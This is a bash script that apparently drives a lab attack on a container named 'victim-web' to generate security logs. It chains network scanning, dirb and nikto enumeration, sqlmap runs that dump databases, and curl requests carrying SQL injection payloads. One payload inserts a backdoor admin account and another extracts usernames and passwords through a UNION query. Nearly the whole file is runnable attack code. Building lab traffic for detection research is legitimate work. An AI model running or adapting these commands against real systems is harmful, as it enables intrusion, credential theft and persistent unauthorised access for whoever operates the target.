#!/bin/bash

# Real Attack Execution Script
# Coordinates all attack activities against the target

set -e

echo "[$(date)] Starting SecurityLogs Attack Execution..."

# Load environment variables
source /opt/.env 2>/dev/null || true

# Set default values
TARGET_HOST=${TARGET_HOST:-"victim-web"}
TARGET_URL=${TARGET_URL:-"http://victim-web"}
NMAP_RATE=${NMAP_RATE:-0.016}
SQL_DELAY=${SQL_DELAY:-120}
SQLMAP_THREADS=${SQLMAP_THREADS:-1}

echo "[$(date)] Configuration:"
echo "  Target Host: $TARGET_HOST"
echo "  Target URL: $TARGET_URL"
echo "  NMAP Rate: $NMAP_RATE packets/sec"
echo "  SQL Delay: $SQL_DELAY seconds"
echo "  SQLMap Threads: $SQLMAP_THREADS"

# Wait for target to be ready
echo "[$(date)] Waiting for target to be ready..."
while ! curl -s "$TARGET_URL" > /dev/null 2>&1; do
    echo "[$(date)] Target not ready, waiting..."
    sleep 5
done
echo "[$(date)] Target is ready!"

# Phase 1: Network Reconnaissance
echo "[$(date)] Phase 1: Network Reconnaissance"
echo "[$(date)] Running network scan..."
python3 /opt/scripts/network_scan.py

# Wait between phases
echo "[$(date)] Waiting between phases..."
sleep 10

# Phase 2: Web Application Enumeration
echo "[$(date)] Phase 2: Web Application Enumeration"
echo "[$(date)] Running directory enumeration..."

# Use dirb for directory enumeration
dirb "$TARGET_URL" /usr/share/dirb/wordlists/common.txt -o /opt/output/dirb_results.txt -S -r

# Use nikto for web vulnerability scanning
echo "[$(date)] Running Nikto web vulnerability scan..."
nikto -h "$TARGET_URL" -o /opt/output/nikto_results.txt -Format txt

# Wait between phases
echo "[$(date)] Waiting between phases..."
sleep 15

# Phase 3: SQL Injection Attacks
echo "[$(date)] Phase 3: SQL Injection Attacks"
echo "[$(date)] Running custom SQL injection script..."

# Run our custom SQL injection script
python3 /opt/scripts/sql_injection.py

# Wait between phases
echo "[$(date)] Waiting between phases..."
sleep 20

# Phase 4: SQLMap Automated Testing
echo "[$(date)] Phase 4: SQLMap Automated Testing"
echo "[$(date)] Running SQLMap against login form..."

# SQLMap against login form
sqlmap -u "$TARGET_URL/login.php?user=*&pass=*" \
    --batch \
    --random-agent \
    --threads="$SQLMAP_THREADS" \
    --delay="$SQL_DELAY" \
    --time-sec=10 \
    --risk=1 \
    --level=1 \
    --output-dir=/opt/output/sqlmap_login

echo "[$(date)] Running SQLMap against search form..."
# SQLMap against search form
sqlmap -u "$TARGET_URL/search.php?q=*" \
    --batch \
    --random-agent \
    --threads="$SQLMAP_THREADS" \
    --delay="$SQL_DELAY" \
    --time-sec=10 \
    --risk=1 \
    --level=1 \
    --output-dir=/opt/output/sqlmap_search

# Phase 5: Advanced Exploitation
echo "[$(date)] Phase 5: Advanced Exploitation"
echo "[$(date)] Attempting to extract database information..."

# Try to extract database information
sqlmap -u "$TARGET_URL/search.php?q=*" \
    --batch \
    --random-agent \
    --threads="$SQLMAP_THREADS" \
    --delay="$SQL_DELAY" \
    --time-sec=10 \
    --risk=2 \
    --level=2 \
    --dbs \
    --tables \
    --dump \
    --output-dir=/opt/output/sqlmap_advanced

# Phase 6: Post-Exploitation
echo "[$(date)] Phase 6: Post-Exploitation"
echo "[$(date)] Attempting to create backdoor user..."

# Try to create a backdoor user (this will actually work due to SQL injection)
curl -s "$TARGET_URL/login.php?user=admin'%3B%20INSERT%20INTO%20users%20VALUES%20(999,'hacked','hacked','hacked@evil.com','admin')%3B--&pass=dummy" > /dev/null

echo "[$(date)] Attempting to extract sensitive data..."
# Try to extract user credentials
curl -s "$TARGET_URL/search.php?q='%20UNION%20SELECT%201,username,password,email,role%20FROM%20users--" > /opt/output/extracted_data.html

# Generate attack summary
echo "[$(date)] Generating attack summary..."
cat > /opt/output/attack_summary.txt << EOF
SecurityLogs Attack Summary
==========================
Timestamp: $(date)
Target: $TARGET_HOST
Target URL: $TARGET_URL

Attack Phases Completed:
1. Network Reconnaissance
2. Web Application Enumeration
3. SQL Injection Attacks
4. SQLMap Automated Testing
5. Advanced Exploitation
6. Post-Exploitation

Files Generated:
- /opt/output/network_scan_results.json
- /opt/output/dirb_results.txt
- /opt/output/nikto_results.txt
- /opt/output/sql_injection_results.txt
- /opt/output/sqlmap_login/
- /opt/output/sqlmap_search/
- /opt/output/sqlmap_advanced/
- /opt/output/extracted_data.html

Attack completed at: $(date)
EOF

echo "[$(date)] Attack execution completed!"
echo "[$(date)] Results saved to /opt/output/"
echo "[$(date)] Check attack_summary.txt for details"

# Keep container running for analysis
echo "[$(date)] Keeping container alive for analysis..."
tail -f /dev/null 